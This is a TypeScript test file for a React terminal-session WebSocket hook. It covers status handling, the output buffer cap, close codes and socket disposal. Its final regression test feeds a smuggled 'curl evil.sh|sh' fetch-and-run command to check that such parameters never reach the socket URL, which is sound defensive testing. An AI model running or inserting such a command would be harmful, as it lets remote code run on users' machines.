/**
 * Tests for useUnblockSession (issue #156).
 *
 * Mocks the ticket-aware WS connector so we can drive the socket lifecycle:
 * open → status, session id, output buffer cap, the 1008 → "unauthorized"
 * mapping, and disposal closing the socket.
 */

import { describe, it, expect, vi, beforeEach } from "vitest";
import { renderHook, act, waitFor } from "@testing-library/react";

import { useUnblockSession } from "@/hooks/useUnblockSession";
import { openTerminalWebSocket } from "@/lib/websocket-utils";

vi.mock("@/lib/websocket-utils", () => ({
  buildTerminalWsUrl: (qs: URLSearchParams) => `ws://test/?${qs.toString()}`,
  openTerminalWebSocket: vi.fn(),
}));

interface FakeWs {
  readyState: number;
  send: ReturnType<typeof vi.fn>;
  close: ReturnType<typeof vi.fn>;
  onopen: ((e?: unknown) => void) | null;
  onmessage: ((e: { data: string }) => void) | null;
  onclose: ((e: { code: number }) => void) | null;
  onerror: ((e?: unknown) => void) | null;
}

function makeWs(): FakeWs {
  return {
    readyState: 1, // WebSocket.OPEN
    send: vi.fn(),
    close: vi.fn(),
    onopen: null,
    onmessage: null,
    onclose: null,
    onerror: null,
  };
}

beforeEach(() => {
  vi.mocked(openTerminalWebSocket).mockReset();
});

async function mountConnected() {
  const ws = makeWs();
  vi.mocked(openTerminalWebSocket).mockResolvedValue(
    ws as unknown as WebSocket,
  );
  const hook = renderHook(() => useUnblockSession({ mode: "local" }));
  await waitFor(() => expect(ws.onmessage).toBeTypeOf("function"));
  act(() => ws.onopen?.());
  return { ws, hook };
}

describe("useUnblockSession", () => {
  it("reports open and captures the session id", async () => {
    const { ws, hook } = await mountConnected();
    expect(hook.result.current.status).toBe("open");
    act(() =>
      ws.onmessage?.({
        data: JSON.stringify({ type: "session", id: "abcd1234" }),
      }),
    );
    expect(hook.result.current.sessionId).toBe("abcd1234");
  });

  it("appends output but caps the retained buffer", async () => {
    const { ws, hook } = await mountConnected();
    const chunk = "x".repeat(10_000);
    act(() => {
      for (let i = 0; i < 10; i++) {
        ws.onmessage?.({
          data: JSON.stringify({ type: "output", data: chunk }),
        });
      }
    });
    // 100_000 chars fed; retained buffer is capped at 64KiB.
    expect(hook.result.current.output.length).toBeLessThanOrEqual(64 * 1024);
    expect(hook.result.current.output.length).toBeGreaterThan(0);
  });

  it("maps a 1008 close to 'unauthorized'", async () => {
    const { ws, hook } = await mountConnected();
    act(() => ws.onclose?.({ code: 1008 }));
    expect(hook.result.current.status).toBe("unauthorized");
  });

  it("maps a non-1008 close to 'closed'", async () => {
    const { ws, hook } = await mountConnected();
    act(() => ws.onclose?.({ code: 1006 }));
    expect(hook.result.current.status).toBe("closed");
  });

  it("send() writes an input frame when open and no-ops on empty data", async () => {
    const { ws, hook } = await mountConnected();
    let ok = false;
    act(() => {
      ok = hook.result.current.send("\r");
    });
    expect(ok).toBe(true);
    expect(ws.send).toHaveBeenCalledWith(
      JSON.stringify({ type: "input", data: "\r" }),
    );
    act(() => {
      ok = hook.result.current.send("");
    });
    expect(ok).toBe(false);
  });

  it("closes the socket on unmount (disposal)", async () => {
    const { ws, hook } = await mountConnected();
    hook.unmount();
    expect(ws.close).toHaveBeenCalled();
  });

  it("never forwards command/containerName/cwd to the WS query string", async () => {
    // Regression guard for the #156 review RCE: even if a caller smuggles
    // command-execution params in (e.g. lifted from the /m URL), the hook
    // must put ONLY `mode` on the terminal-WS query string.
    const ws = makeWs();
    vi.mocked(openTerminalWebSocket).mockResolvedValue(
      ws as unknown as WebSocket,
    );
    renderHook(() =>
      useUnblockSession({
        mode: "local",
        command: "curl evil.sh|sh",
        containerName: "daax-pwned",
        cwd: "/",
      } as Parameters<typeof useUnblockSession>[0]),
    );
    await waitFor(() => expect(openTerminalWebSocket).toHaveBeenCalled());
    const wsUrl = vi.mocked(openTerminalWebSocket).mock.calls[0][0];
    expect(wsUrl).toBe("ws://test/?mode=local");
    expect(wsUrl).not.toContain("command");
    expect(wsUrl).not.toContain("containerName");
    expect(wsUrl).not.toContain("cwd");
  });
});
